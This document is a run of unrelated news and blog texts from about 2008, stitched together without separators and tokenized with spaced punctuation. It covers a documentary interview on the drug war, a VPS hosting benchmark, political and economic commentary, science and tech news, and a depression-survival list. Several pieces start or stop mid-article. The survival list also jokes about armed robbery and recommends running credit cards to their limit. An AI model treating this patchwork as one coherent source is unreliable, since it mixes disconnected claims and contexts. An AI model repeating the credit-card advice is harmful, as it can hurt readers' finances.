Tonight HIGH premieres at Columbia College Chicago ’s Film Row Cinema , 1109 S. Wabash ( at 11th St. ) at 7:30 p.m .
The film will also be released on November 18 on DVD nationwide on Amazon , Netflix , Hollywood Video and other independent chains .
Recently we spoke with Holowach about his film .
Chicagoist :
What led you to focus on the War on Drugs as a documentary subject ?
Was it something you experienced or learned about around the time you started working on the film two - and - a - half years ago ?
John Holowach : Actually , it was long before that -- when I was in high school .
I may not have wanted to make a movie then , but my opinion of the War on Drugs changed during that period .
I took part in a debate class in which the chosen topic was marijuana legalization .
Liking a challenge , I took the affirmative position , and took to the task of beating my opponent .
I figured it would be quite difficult to argue that such a supposedly dangerous drug should be legalized , but it really was n't .
Science was with me .
Public policy experiments in other countries were with me as well .
The government , which was supposed to tell me the truth , lied to me .
When I discovered what a sham the entire thing was , it crumbled in front of me , and I set about knocking down the other walls with friends and family .
Soon , pretty much everyone I knew was agreeing with my position , because I just overwhelmed them with the facts .
Oh , and I won the debate .
C : How is this documentary different from other films that explore the War on Drugs -- for instance , Kevin Booth 's American Drug War ?
JH : I think it 's really great that there are more serious examinations of the War on Drugs coming out , like Booth 's film -- which I have yet to see , unfortunately .
Sadly , there are still a lot of “ stoner docs ” out there , which really only talk for an hour about how great pot is and how hemp jeans are going to save the planet , followed by ten minutes of flashing colored lights and pulsing music .
My film is nowhere near that .
It 's thoroughly researched , takes the subject matter seriously , and means to help people see what was n't there before .
This is n't to say it 's dry .
As with life , you have to have a sense of humor .
Sometimes laughing is the only thing you can do , in fact .
Just ask some of the pain patients from the film -- the ones you still can , anyway .
C : You emphasize your use of scientific studies and government survey data in conducting your research .
Did you have any experts help you ?
Who were they ?
How did you cross paths ?
JH : Research abounds through the Internets .
And the work of the people such as economist Jeffrey Miron , whom I interviewed for the film , was invaluable .
I really owe a debt to everyone who has produced a paper about drugs over the past 100 years .
I must especially give thanks to the many government commissions which were set up by both the American and Canadian governments to study pot , none of which recommended keeping it illegal ( which is , of course , why they were ignored ) .
C : How did you turn your " huge database of information " into an argument that could be presented in a 90 - minute film ?
JH : I did n't at first .
Originally , the film was three hours long .
When I realized that this was untenable , I decided to really focus on the important points :
What was extraneous ?
What was interesting but did n't really add to the overall message of the film ?
It took quite a while for me ( with the help of my producer and some editors ) to trim it down to the 90 - minute core you see today .
Overall it 's a better film because of it .
C : What 's something that ended up on the cutting floor that you wish had n't ?
JH : The segment with Straight Inc. included an addendum about one of the main funders and co-founders of the program , a mall magnate named Mel Sembler , whose power and influence in Washington got him assigned as an ambassador to Italy , and made him the only ambassador in history to have an embassy building named after him .
Unfortunately , it seemed to drift a little far from the overall theme of the film , and ended up on the cutting room floor .
What do you think of Cindy McCain getting a break from the feds in the 1990s for her own drug - related indiscretions ?
C : I 'm glad she got the help she needed , and I 'm glad she did n't suffer jail for her addiction , but why should she be the only one ?
JH : It 's par for the course .
Those in power always go , “ Do as I say , not as I do . ”
There are countless examples of children and spouses of politicians and policymakers getting a free pass just because of the influence their parents or partners have .
The War on Drugs , and the legal system engulfing it , is one of the most corrupt enterprises in existence today .
As I said in the film , an FBI study found that half of all police corruption cases involved drugs .
Why ?
Because it 's the easiest system to abuse .
I guess justice is n't “ above the influence , ” is it ?
C : How did you fund your film ?
JH : My producer Bob Schubring was the source of funding for the entire venture .
A longtime opponent of the War on Drugs , he responded to a posting about it I made on IMDb Pro and we began our production relationship from there .
I owe this film and my career to him .
My distributor Terra Entertainment , who pulled me from starving artist status to a - bit - hungry artist status , also deserves a great deal of credit for distributing a film that so many others were afraid to touch .
C : Whose story do you think is most tragic ?
JH : Dr. Paul Heberle and his pain patients , most certainly .
He lost a year of his life , his house , his practice , and went a $ 250,000 in debt in legal expenses fighting ridiculous charges [ for over - prescribing controlled substances ;
Heberle apparently was again arrested this week on new charges ] .
And who suffered besides ?
His patients .
All for nothing .
I 'll repeat that : for nothing .
About a year after I completed the film , an older cut was being screened at Ohio State , and I invited them to come over from Pennsylvania to watch .
So the lot of them piled into vans and drove .
One of the patients I interviewed was on new medication –- an anti-depressant .
Those are sometimes prescribed because they are n't regulated like opioid drugs , but they have similar pain - relieving effects .
The downside is that she was completely out of it , acting drugged - up and like she was only half - there .
It was sad and made me feel miserable that she could n't just be on the medication that helped her .
The government measures success in how many people are injecting , smoking , snorting , or popping drugs .
Forget if more people are dying , more people are suffering , or more people are losing their sense of self and in intractable pain because “ drugs are bad , m'kay ? ”
I do n't claim to have all the answers , but I do know one thing :
We need less death and less suffering -- not more -- but that 's all the so - called War on Drugs brings .
We can afford to be cautious .
What we can't afford is to be so narrow - minded and closed off to any possibility of changing the system that we resign ourselves to “ the devil you know . ”
I 'm tired of the devil we know , and I think most everyone else is , too .
Update : since I did these statistics , Linode has upgraded their memory offering even more , which means that their offer is even better than what I show here .
As of summer 2010 , Slicehost 's offering really is n't very competitive , unfortunately .
I continue to hear that they do provide great service , but so does Linode .
Since hosting is * the* major expense for http://www.dedasys.com, and obviously a critical part of much of what I do , getting the right one is very important .
Naturally , " the right one " for me may not be the right one for everyone .
I am a fair sysadmin for small numbers of machines , so I do n't mind doing that myself – I do n't need , nor want to pay for hand holding .
Since this post has become fairly popular , I am going to link to my Linode affiliate URL if you 'd like to sign up with Linode – thanks !
Other than running my sites there , I have no other affiliation with Linode .
And , if you 're more a fan of Slicehost , here is my referral page on Slicehost
I recently moved everything over to [ Slicehost ] ( http://www.slicehost.com) on the recommendations of friends , and am so far fairly happy with the experience .
It 's cheaper , simpler , and more flexible than Layered Tech was .
To boot , I also like the fact that Slicehost is run out of St. Louis , Missouri , rather than some really expensive tech center like San Francisco or Boston .
Hosting is basically a commodity , and much like you would n't want to put a factory in San Francisco , you do n't want your hosting their either .
However , I discovered something annoying about Slicehost : they use x86_64 servers , which , per se , does n't really matter to me – I use open source code that can run on any number of architectures .
The problem is that this particular architecture uses more memory than plain old x86 .
Significantly more .
My Layered
Tech server with 1 gig of memory was hitting the swap space a bit , but the same code on a slice was swapping quite heavily , despite the fact that I 'd moved PostgreSQL off to its own slice .
Since I pretty much exclusively run Rails , I decided to look into Phusion 's " Ruby Enterprise Edition " , which is basically just some nice hacking on Ruby 's garbage collection mechanism .
What they 've done is nice , and I may end up using it , but ultimately it 's buying me space that I would also gain from simply moving back to x86 .
With that in mind , I decided to take another look at what appears to be emerging as one of Slicehost 's main competitors , [ Linode ] ( http://www.linode.net), who * do * use x86 servers .
Here are my results , which are admittedly not all that scientific , but what the heck – you 're getting them for free , and they were pretty quick to whip up .
### Service , Support , Setup
But before we begin with the numbers , I want to add a few words of caution .
One of the big things about hosting , to me at least , is how they deal with unexpected random negative events .
Connections going down , disk breakage , DoS attacks , and so on .
It 's really hard to get an idea of just what sort of people you 're dealing with until you 've " ridden the river together " .
I do n't really know what sort of response times , uptime , and all that either Slicehost or Linode have , so there are potentially some big intangibles there that are not quite as easy to draw pretty charts for .
In terms of the console / setup / management tools , I liked Slicehost 's simplicity more – Linode gives you more options , but they 're a bit fiddly and cluttered feeling at times .
For instance , Linode lets you pick how much swap space to give your disk image , but does n't include a bit of javascript to balance out the swap and regular partitions , so that if you type in a larger swap number , you have to do the math and subtract that from the other number .
Annoying , but not a big deal .
Linode lets you pick various data centers in the US ( no Europe , yet ) .
Slicehost gives you the option to do backups of your disk images , which is nice , and something that Linode lacks .
### Comparing plans Since I 'm interested in comparing hardware and machines I actually have access to , here are the plans I am currently signed up with , and the salient numbers :
Slicehost 1024 Slicehost 512 Linode 720 Memory 1024 512 720 Bandwidth 400 200 400 Disk 40 20 24 Cost 70 38 39.95
Memory / Dollar : Bandwidth / Dollar : Disk / Dollar : Linode mostly comes out ahead , but not by that much , except for bandwidth .
However , let 's take a crude look at x86_64 vs x86 memory usage .
First , `./ script/console` ( a Rails console ) for the same code base on two different machines , showing the virtual memory size ( VSZ ) and resident set size ( RSS ) :
And just to look at something else that 's a bit smaller , I ran the following script : puts File.open ( " / proc/self/status " , " r " ) .read
And got the following data : Being charitable with those numbers , we get x86 taking up 77 % the memory that x86_64 does .
So let 's add that to our comparison of how much memory you 're getting per dollar on Slicehost and Linode : Wow !
That 's a fairly significant difference .
### Performance
That 's most of what we can glean from published numbers , and running a few simple experiments .
However , there 's another factor that 's important : performance .
" Virtual Private Server " systems , or simply VPS's , got a bad name in the past because they were " overbooked " – too many virtual servers competing for the same CPU resources on one machine .
Slicehost and Linode both look like they want to avoid that kind of bad reputation , and so far all the systems I have used have felt snappy and responsive .
Now here 's where we get really unscientific …
I decided to try and do * something * , even if it was n't much , to get some kind of objective measurement of what kind of CPU I was getting on the machines .
This is really unscientific , because the machines do have other duties ( I do n't have the cash , time or inclination to set up random servers just for testing ) , and of course , who knows what else is sharing the computer with my systems : if you get a relatively unused computer , you can apparently pick up extra cycles for yourself , over and above your guaranteed minimum .
But c'est la vie , and so I decided to do some numbers anyway .
I picked a C implementation of mandelbrot from the [ language shootout ] ( http://shootout.alioth.debian.org/u32q/benchmark.php?test=mandelbrot) more or less " for the hell of it " ( I 'm going to keep repeating " unscientific " and invite someone to do better tests than I have ) .
I ran this code every 20 minutes for a couple days , and then averaged out the run times :
As expected , the higher power Slicehost 1024 machine wins out in terms of raw speed ( less time is better ) , but not by that much over the Linode system .
Indeed , when we factor in the relative prices , Linode comes out ahead , again :
So it looks like we 're not paying a CPU penalty for having more memory , bandwidth , disk , etc … ### Notes *
Nothing in these statistics is indicative of future directions that both Linode and Slicehost might take .
Slicehost was recently acquired by Rackspace , and that could have effects on the service they provide .
Maybe one or both will come under financial pressure and start " overbooking " their servers .
*
The spreadsheet I used is available via Google docs , for the curious .
I did most of the work in OpenOffice , and then uploaded it though , because working with the web spreadsheet was kind of painful .
Unfortunately , you can't select non-contiguous data ranges in the Google spreadsheet , so the labels are interspersed with the data .
Yuck .
Also , Google docs does n't handle ' time ' values nicely , which is what the performance data was originally .
The spreadsheet is here : * The standard deviation on the processing times is higher for both slices than the linode system .
Not quite sure what that means in terms of what 's going on under the hood , but I thought it was interesting .
Young voters also triumphed over the condescension of the experts .
“ Are they going to show up ? ” Cokie Roberts of ABC News asked in February .
“ Probably not .
They never have before .
By the time November comes , they ’ll be tired . ”
In fact they turned up in larger numbers than in 2004 , and their disproportionate Democratic margin made a serious difference , as did their hard work on the ground .
They ’re not the ones who need Geritol .
The same commentators who dismissed every conceivable American demographic as racist , lazy or both got Sarah Palin wrong too .
When she made her debut in St. Paul , the punditocracy was nearly uniform in declaring her selection a brilliant coup .
There had n’t been so much instant over - the - top praise by the press for a cynical political stunt since President Bush “ landed ” a jet on the U.S.S. Abraham Lincoln in that short - lived triumph “ Mission Accomplished . ”
The rave reviews for Palin were completely disingenuous .
Anyone paying attention ( with the possible exception of John McCain ) could see she was woefully ill - equipped to serve half - a- heartbeat away from the presidency .
The conservatives Peggy Noonan and Mike Murphy said so on MSNBC when they did n’t know their mikes were on .
But , hey , she was a dazzling TV presence , the thinking went , so surely doltish Americans would rally around her anyway .
“ She killed ! ” cheered Noonan about the vice - presidential debate , revising her opinion upward and marveling at Palin ’s gift for talking “ over the heads of the media straight to the people . ”
Many talking heads thought she tied or beat Joe Biden .
The people , however , were reaching a less charitable conclusion and were well ahead of the Beltway curve in fleeing Palin .
Only after polls confirmed that she was costing McCain votes did conventional wisdom in Washington finally change , demoting her from Republican savior to scapegoat overnight .
But Palin ’s appeal was n’t overestimated only because of her kitschy “ American Idol ” star quality .
Her fierce embrace of the old Karl Rove wedge politics , the divisive pitting of the “ real America ” against the secular “ other ” America , was also regarded as a sure - fire winner .
The second most persistent assumption by both pundits and the McCain campaign this year  after the likely triumph of racism  was that the culture war battlegrounds from 2000 and 2004 would remain intact .

This is true in exactly one instance : gay civil rights .
Though Rove ’s promised “ permanent Republican majority ” lies in humiliating ruins , his and Bush ’s one secure legacy will be their demagogic exploitation of homophobia .
The success of the four state initiatives banning either same - sex marriage or same - sex adoptions was the sole retro trend on Tuesday .
And Obama , who largely soft - pedaled the issue this year , was little help .
In California , where other races split more or less evenly on a same - sex marriage ban , some 70 percent of black voters contributed to its narrow victory .
SAN FRANCISCO ( Reuters ) - Shares of Yahoo Inc soared 10 percent on Tuesday on hopes that the departure of Jerry Yang , its embattled chief executive , would clear the way for a deal with Microsoft Corp .
Yahoo announced late on Monday that Yang , whose leadership had come under growing criticism from shareholders after he failed to agree to a deal with Microsoft , would step down from his role as soon as the board finds a replacement .
Yahoo is evaluating both internal and external candidates for the top post , and has hired executive search firm Heidrick & Struggles to run the search process .
Analysts said
Yang ’s decision to step down is a sign that the board was frustrated with his efforts to turn around the company , which he co-founded .
Yang took on the CEO role in June 2007 .
“ Jerry ’s resignation as CEO reflects failed promises he made while fighting off Microsoft ’s offers , and the board ’s displeasure with his go - it - alone strategy , ” wrote Jefferies & Co analyst Youssef Squali in a research note .
Microsoft on January 31 offered $ 31 a share , or $ 44.6 billion , to buy all of Yahoo , an offer the Internet company rejected .
Microsoft later sweetened its bid but withdrew it in May after being turned down by Yahoo again .
Analysts said Yahoo ’s board could now grab the opportunity to approach Microsoft under a new CEO .
“ The departure of Yang could signal a new position by the board to reconsider the terms of a merger with Microsoft , ” said Needham & Co analyst Mark May in a research note .
He said the move was “ appropriate ” after Yahoo failed to strike a deal with Microsoft , teaming up with rival Google Inc to do a search advertising partnership that Google eventually abandoned .

Yahoo ’s shares rose 10.3 percent , or $ 1.10 , to $ 11.73 in midday trading on the Nasdaq .
The shares have fallen roughly 65 percent this year while Yahoo has struggled to find a way to make money as advertisers have scaled back on spending amid a wider economic downturn .
Trading volumes were running higher than usual in the options market on Tuesday , with investors actively buying Yahoo call options on expectations that the stock will continue to move higher during the rest of the year , said Frederic Ruffy , options strategist at New York - based Web information site WhatsTrading.com .
“ Yahoo shares are up as investors applauded news that its CEO Jerry Yang is stepping down , ” Ruffy said .
WHY FREE TRADE WILL COME UNDER ATTACK .
Mexico has benefited from Nafta .
In the current global financial crisis , of course , a lot of people are going to be questioning free trade and international integration and all of those things .
. . .
Yes , the financial system clearly got out of kilter , and Treasury Secretary Hank Paulson and the president and Congress are dealing with that .
But it should n’t go to the core principles of markets , the importance of open trade , the fact of globalization — which is not going to go backwards .
IV .
THE MIDDLE EAST AND BEYOND
HOW WE CHANGED THE CONVERSATION .
There have been some real gains , but there also has been a complete change in the conversation , particularly in the Middle East , where some form of popular legitimacy is being sought in almost every country .
The American voice has got to stay strong in that conversation .
HOW TO MOVE THE CONVERSATION FORWARD .
I really think we have the best atmosphere between Palestinians and Israelis since the mid-’90s , so I ’m very gratified that that has come into place .
The Palestinian leadership is avowedly in favor of negotiations , renounces violence , recognizes the right of Israel to exist .
There is a robust negotiating process , and they have made a lot of progress on how to get to a two - state solution .
There is now broad Israeli acceptance of the need for a Palestinian state .
After all , Kadima came out of Likud ( 6 ) with that in mind .
And we have a process on the ground that is beginning to make some progress in terms of making life better for people who live on the West Bank .
Palestinian security forces are becoming competent enough that they ’re now about to move into Nablus , one of the toughest areas , with Israeli consent .
WHY SPEED IS ESSENTIAL TO DEALING WITH HAMAS .
The Hamas takeover of Gaza is a problem , but thanks to good Egyptian work , at least there is calm for now .
One reason to try and get an agreement done pretty quickly is that I think Palestinian Authority President Mahmoud Abbas needs to be able to take an agreement to the Palestinian people through either referendum or elections in order to sideline Hamas politically or to have Hamas buy in , which I think is unlikely , or to sideline Hamas by demonstrating that they do n’t have a solution for the Palestinian problem .
So that ’s another reason to do it quickly .
But I think the structure is there , I think the Annapolis structure is a very powerful structure . . .
On the Palestinian - Israeli issue , we will leave this in a much , much better place , agreement or no .
HOW TO CHANGE A REGIME  SLOWLY .
We have said to Iran that this is about changing your regime ’s behavior , not changing your regime .
That has been the message all along .
Would we hope that the Iranian people . . . do they deserve to have a different regime than they ’ve got ?
Absolutely .
But the way that we have tried to help with democracy in Iran is to help indigenous forces there — to bring everyone from people who do disaster relief to artists to sending our wrestlers there .
You know , it ’s why the question of an interests section continues to be important to us .
( 7 )
FINDING PRO - AMERICANISM
IN IRAN .
There ’s a very pro-American feeling among most Iranians not because of our policies but because of who we are and because we have stood for democracy .
Iranians are sophisticated people — that ’s a sophisticated and great culture — and we need to be able to reach out to them .
But in terms of dealing with the regime , I think we ’ve made it very , very clear that we ’re prepared to deal with the regime ; we just do n’t want them to use negotiations as a cover while they improve their nuclear - weapons capability .
V. TWILIGHT OF THE INSTITUTIONS ?
DISCOVERING WHETHER THE “ RESPONSIBILITY TO PROTECT ” MEANS ANYTHING .
I think we thought the Responsibility to Protect meant something .
(8) I remember when the responsibility - to - protect language came up at the 2006 United Nations General Assembly , and I remember thinking at the time :
If this turns out to be nothing but words , the Security Council is going to have a real black eye , and in the Darfur case it has turned out to be nothing but words .
I think it has been an enormous embarrassment for the Security Council and for multilateral diplomacy .
AT THEIR summit in Washington , DC , last weekend , the leaders of the G20 — the world 's biggest rich and emerging economies — promised “ rapid ” fiscal stimulus to prop up their economies .
Sadly , America already seems to be failing to keep that promise , paralysed by the politics of transition .
As The Economist went to press , a Democrat - backed plan for a $ 100 billion fiscal boost , which included a modest rise in infrastructure spending and some aid to the states as well as a misguided bail - out for Detroit 's carmakers , seemed doomed in the Senate .
The lame - duck Congress looks set to deliver nothing more than an extension of unemployment benefits .
Serious debate about a broader stimulus has been put off until the new president and legislature take over in January .
That may not seem long .
But given the deterioration of America 's economy in recent weeks , the delay is dangerous .
From tumbling retail sales to soaring unemployment claims , the latest statistics suggest that the economy has grown increasingly grim ( see article ) .
Private demand is plunging as consumers are battered by tight credit , falling wealth and rising unemployment , while fearful firms hunker down .
Americans ' collective and sudden rediscovery of thrift is pushing the economy into its worst recession since at least 1982 .
And unlike the early 1980s , there is little prospect of a quick turnaround .
Shovel it out to the states
Normally spending splurges are to be distrusted , but the scale of this downturn argues for bold budgetary action .
Large sums will be needed : at least $ 300 billion , or more than 2 % of GDP .
And with so swift a decline , speed is of the essence , not least because America has far fewer “ automatic stabilisers ” than other rich countries with which to cushion a recession .
Thanks to the changing nature of America 's workforce , unemployment insurance offers less of a prop to demand than it used to .
The proportion of part - time workers , for instance , is higher than it was a generation ago , but in nearly two - thirds of states part - time workers are ineligible for unemployment benefits .
The states ' fiscal rules , which require most of them to balance their budgets , also make a federal stimulus more urgent .
With revenues vanishing , the states collectively face a $ 70 billion budget gap this year .
Half have already started cancelling infrastructure projects , cutting health - care benefits or laying off workers .
The federal government can counter this .
A bill to modernise unemployment insurance has already passed the House of Representatives , though it languishes in the Senate .
Washington can shovel money to the states quickly and easily , for instance by increasing its share of jointly financed spending , such as Medicaid , which pays for poor people 's health care .
The Senate Democrats ' stimulus plan would have done this , if too timidly .
Republican opposition , based on a misguided aversion to government spending and political sour grapes , is short - sighted in the extreme .
Nor , though , are the Democrats blameless .
Looking ahead to bigger majorities in January , congressional Democrats have been less than eager to seek compromise .
More worrying , too many on the left are keener on the grand rhetoric of redefining government 's role than on the practicalities of designing effective stimulus .
Washington is full of talk of a new New Deal ( see article ) to put many thousands to work building a greener America .
But details are scant , even as many states have scores of “ shovel - ready ” infrastructure projects set to be axed .
Cushioning America 's downturn will demand fiscal boldness , but that does not mean eschewing simple , speedy solutions .
Quick and plentiful aid to the states is one of the best .
Scientists have uncovered a chain reaction which could link a type of bacterium living in our intestines to the development of colon cancer .
Enterococcus faecalis is harmless in the vast majority of people , but US scientists have found that it can produce harmful chemicals .
The Journal of Medical Microbiology study found these can damage DNA , and prompt gene activity linked to cancer .
A UK expert said it was plausible that bacteria could cause colon cancer .
However , he stressed that E.faecalis was very unlikely to be the only bacterium which had such an effect .
This research puts into perspective the complexity of the effects normal gut bacteria can have on the health of the individual
Professor Mark Huycke
Researcher
Our guts provide a home to dozens of different types of bacteria , many of which actually provide a useful service , helping break down indigestible sugars in food by fermentation , or even " training " the body 's immune system .
However , in recent years , scientists have suggested that in certain , susceptible individuals , these bacteria can actually do harm .
E.faecalis , sometimes also known as Group D Streptococcus , is one of those under suspicion , and the research by the Department of Veterans Affairs Medical Center in Oklahoma City strengthens the link .
The researchers investigated how colon cells in the laboratory reacted to the presence of the bacterium , when it is in a " fermentation " state .
In this state , it produces a kind of oxygen molecule called " superoxide " , and it is this which can damage DNA in surrounding cells .
Gene activity Professor Mark Huycke , who led the research , found that the apparent effects were not limited to this .
" We found that superoxide led to strong signalling in immune cells called macrophages - it also altered the way some cells in the gut grew and divided and even increased the productivity of genes which are associated with cancer . "
In total , the expression of 42 genes linked to vital processes in human cells was altered by the presence of E. faecalis in this state .
" This research puts into perspective the complexity of the effects normal gut bacteria can have on the health of the individual . "
Dr Barry Campbell , a gut microbiology researcher from the University of Liverpool , agreed that E.faecalis was a candidate for cancerous changes .
However , he said that other bowel bacteria could also be behind the cell changes which eventually lead to tumours .
He said : " There is not going to be only one culprit .
Our own team is interested in a particular type of E.coli with this in mind .
" There are also many other factors which are involved , such as genetics and environment . "
Professor Ian Rowland , a specialist in gut bacteria from Reading University , said : " This shows how it could happen , although whether this actually does happen in a human is another matter .
" There is a lot of circumstantial evidence that gut bacteria are important in colorectal cancer , although we do n't fully understand why .
" In the case of Enterococcus faecalis , we know that most people have this in their gut , but most people do n't get colon cancer , so there must be other factors involved . "

The clock face is gold - plated and almost 4ft wide A £ 1 m clock called the " time eater " has been unveiled at Cambridge University by Professor Stephen Hawking .
The author of A Brief History of Time was guest of honour when the unique clock , which has no hands or numbers , was revealed at Corpus Christi College .
Dubbed the strangest clock in the world , it features a giant grasshopper and has 60 slits cut into its face which light up to show the time .
Its creator John Taylor said he " wanted to make timekeeping interesting " .
The Corpus Clock will stand outside the college 's library and will be on view to the public .
Tribute Dr Taylor is an inventor and horologist - one who studies the measurement of time - and was a student at Corpus Christi in the 1950s .
He has given the clock as a gift to his former college .
The grasshopper or " chronophage " , meaning " time eater " , advances around the 4ft - wide face , each step marking a second .
Its movement triggers blue flashing lights which travel across the face eventually stopping at the correct hour and minute .
But the clock is only accurate once every five minutes - the rest of the time the lights are simply for decoration .
Professor Stephen Hawking unveiled the unique clock Dr Taylor , 72 , designed the timepiece as a tribute to English clockmaker John Harrison who solved the problem of longitude in the 18th century .
Harrison also invented the grasshopper escapement - a tiny internal device that releases a clock 's gears at each swing of its pendulum .
Dr Taylor told the Daily Mail newspaper he decided " to turn the clock inside out ... so you can see the seconds being eaten up " .
" Conventional clocks with hands are boring , " he said .
" I wanted to make timekeeping interesting .
" I also wanted to depict that time is a destroyer - once a minute is gone you can't get it back .
" That 's why my grasshopper is not a Disney character .
He is a ferocious beast that over the seconds has his tongue lolling out , his jaws opening , then on the 59th second he gulps down time . "
Big Ben Cannot play media .
Sorry , this media is not available in your territory .
The Corpus Clock is wound up by an electric motor which will last for the next 25 years .
It took a team of eight engineers and craftsman five years to mould the 24 - carat gold - plated face .
Alan Midleton , curator of the British Horological Institute , said : " It 's a wonderful idea .
" Only time will tell whether it will become as famous as Big Ben - I doubt it , actually . "
Dr Taylor made his fortune developing the kettle thermostat .

Solar - Powered Plane to Perform Test Flight
November 17th , 2008 by Ariel Schwartz
It ’s hard enough to construct viable solar - powered vehicles , let alone airplanes .
Nevertheless , the first solar - powered plane trip around the world is now one step closer to reality .
A 1500 kilogram solar plane dubbed “ Solar Impulse ” will complete its first test flight next April .
The plane , which has a 61 meter wingspan , will attempt to travel around the world in May 2011 .
It will go into commercial production the same year .
Solar Impulse ’s solar cells are placed on the upper surface of its wings , while the underside is wrapped in film .
The plane ’s solar system works by using 12,000 photovoltaic cells , each containing 130 micron monocrystalline silicon .
Solar Impulse can fly in the dark by using a 400 kilogram deep cycle battery bank .
It will be interesting to see how the plane ’s around - the - world attempt fares , but solar power will probably be relegated to small planes no matter what the outcome .

As mentioned a couple of weeks ago in Bob Dylan :: After The Crash ( 1967 - 1970 ) , back in 2005 AD posted the unreleased tracks from Bob Dylan and Johnny Cash ’s 1968 sessions .
With the Legacy reissue of Johnny Cash At Folsom Prison and the October release of Bob Dylan ’s Bootleg Series Volume 8 ( more on that later ) a re-post felt both warranted and appropriate .
This is a true peice of Americana — two iconic masters of their craft conversing with one another via song .
Recorded throughout 1969 on three separate occasions , these recordings mark an important historical collaboration between two American poets / musicians .
Even a casual fan of either artist should at least give these a cursory listen .
Great stuff .

There is a chance that the world could be heading in to a depression , so it seems appropriate to make a list that will come in handy should that eventuate .
We all hope that it wo n’t be the case , but there is no reason at all to not be prepared just in case .
Hopefully at least one or two of these tips will be useful to you all .
10 Get To Know Your Neighbors
It is a very good idea to get to know your neighbors well – even in times of a normal economy .
Your neighbors can keep an eye on your home while you are away , they can feed the pets , and they can lend you a cup of sugar if you need one !
In the event of a depression they can be even more useful – you can create a small community where you can share necessities that one may have and others lack , you can set up patrols ( if the situation were so dire as to need it ) , and you can even have shared meals which can help to keep waste and costs down .
9 Buy Metal
If you have a considerably large amount of money , you will probably want to consider investing some of it in metals – such as gold and silver ( though these are already seeing massive price increases ) .
Of course , if you have a fortune you probably already know this , but it does n’t hurt to remind people .
In the event of a collapse of your nation ’s currency , you will need a backup – and precious metals have been shown in the past to be an excellent one .
8 Stockpile Drugs
If you regularly take medication , try to stockpile as much as you can .
In a depression you may find that you can not afford drugs , or – in a worst case scenario , the drug companies may go under !
Additionally , store up bottles of aspirin and other common over - the - counter drugs that we all tend to use from time to time throughout the year .
As you use these drugs , be sure to use the ones that are the closest to their expiry date – to prolong the life of the others .
7 Save Money
Right now .
Begin saving as much money as you can .
Cut down on all of your expenses ( except debt repayment ) and save every penny .
If we end up in a depression , you are going to need it .
This is also a good time to start thinking about selling any items in your home that you may not need .
If it becomes very likely that a depression is going to hit , sell everything non-essential – that means the TV , DVD player , stereos , etc .
I would recommend that you keep your computer ( preferably a laptop in case you lose your home and need to move around ) as it will come in handy when the depression ends .
6 Get rid of debt
You should try to get rid of as much debt as you can right now .
While you can pay your mortgage now , you may not be able to in a month – and as banks are feeling the pinch , they are not going to tolerate even one missed payment .
This can obviously lead very easily to you losing your home .
If you think the recession now is painful , try suffering it on the streets !
This is a tip to help you cope before the depression hits .
If you find yourself in an untenable situation and the depression has already arrived , forget this tip and read the bonus item carefully .
5 Move your stocks
If you own stock , it is now a good time to consider the types of companies that are likely to do well in a depression – these are the companies you should move your stocks in to .
The companies most likely to survive and profit are dry food manufacturers , diaper and toilet paper manufacturers , and any company making products that are seen as essential to survive .
“ Comfort ” and “ sin ” stocks like cigarettes , alcohol , etc. are also stocks that do extremely well during bad times as people rely on them to blot out their suffering .
4 Learn a useful trade
Some trades are more in demand during a depression than others .
For example , a baker , a handyman , or an electrician should be able to find work during the worst economic downturn , but a change control facilitator may not .
Invest in some good old fashioned skills now and not only will it help you survive a depression , it may well be a complete career change for you in the future .
3 Store up Food
Right now you should be hoarding dried and canned foods .
Also tablets for purifying water and other nice - to - haves like toilet paper , candles , and batteries .
I know this sounds like preparations for a nuclear holocaust , but the effects could be horrifyingly similar .
Keep all of your goods in a dry clean area .
I would also recommend a book on the basics of cooking , so you can convert your flour to bread and perform other culinary miracles that require nothing processed or pre-packaged .
This is a skill that will be invaluable whether we have a depression or not .
2 Relocate or buy an RV
If you think you are in a job that is likely to not be needed during a depression , you should consider relocating to an area that has a lot of wildlife and land .
If you lose your house , an investment in an RV now ( not on credit ! ) could be your life - saver .
You can drive it to a new town , find a private area where you wo n’t be disturbed , and park up while the depression rides out .
Make sure you find an area where you can rely on plentiful fresh water and animals – which brings us to item one …
1 Buy a Gun
If things get so bad that people begin to steal off each other , this will come in very handy .
You can use it to protect your family and belongings , as well as to kill animals for food .
And if you really are in dire straits , you can use it to rob someone else !
( Okay – I did n’t mean that – we should all try to help each other out – not kill each other ) .
A gun will be most useful in hunting so be sure to buy one that is practical for shooting birds and larger animals .
You will also want to buy a book on how to skin , clean , and prepare wild animals for human consumption .
+ Blow your credit cards
Okay – this is going to appear very controversial – but this is about surviving a depression ; this is a matter of living or dying .
If you are about to go bankrupt , are out of work , and see no hope in the foreseeable future of correcting this situation , use your credit cards right to the limit to put yourself in a better position – whether it be buying food , or moving somewhere you might be able to find work .
If we really do enter another great depression , you will have to be prepared to do things you would normally not do in order to ensure the survival of your family and yourself .
Under any other circumstances , this would be a very very bad thing to do .

Microsoft is giving free software to startups around the world to encourage them to develop products that span the Web , PCs and phones , the company said today .
The program , called BizSpark , is expected to make it easier for Microsoft to compete against Google and other Web rivals with its nascent cloud computing strategy , which was announced last week , and also make it easier for startups to work with Microsoft .
" I think it 's terrific and something that 's sorely needed , " said Pascal Levensohn , founder of Levensohn Venture Partners in San Francisco .
" They 're seeding an entire new ecosystem by casting their net very widely to harness innovation . "
MBA BY THE BAY : See how an MBA could change your life with SFGATE 's interactive directory of Bay Area programs .
Through BizSpark , Microsoft will offer free software development tools , technical support , marketing and discounted hosting for three years to qualified startups in more than 80 countries , said Corporate Vice President Dan'l Lewin , who designed the program .
The startups will be recommended by a network of partners Microsoft has been building : venture capitalists , university incubators , angel investors and others , including the National Venture Capital Association and TiE Global .
The only restrictions are that startups be private , less than 3 years old and have less than $ 1 million in revenue .
" It 's been my idea for a long time that we work toward this program , " said Lewin , who was hired by Microsoft seven years ago to improve relations between Microsoft and Silicon Valley .
" This is my baby . "
Lewin said Microsoft is " completely committed " to making its software interoperable with any other software that startups want to use and they are free to leave the program at any time .
If they make it through three years , they pay a $ 100 fee and graduate into Microsoft 's standard software licensing program , he said .
One startup that 's already joined the program - ZocDoc , a Web site that helps people find and make appointments with doctors and dentists in New York City - was discovered by Microsoft in September at the TechCrunch 50 conference in San Francisco , said Nick Ganju , ZocDoc 's chief technology officer .
ZocDoc was already running on Microsoft software but has raised about $ 3 million in venture capital and plans to expand to other areas of the country , he said .
Investors include Khosla Ventures in Menlo Park , Salesforce.com CEO Marc Benioff and Amazon CEO Jeff Bezos ' investment company , Bezos Expeditions .
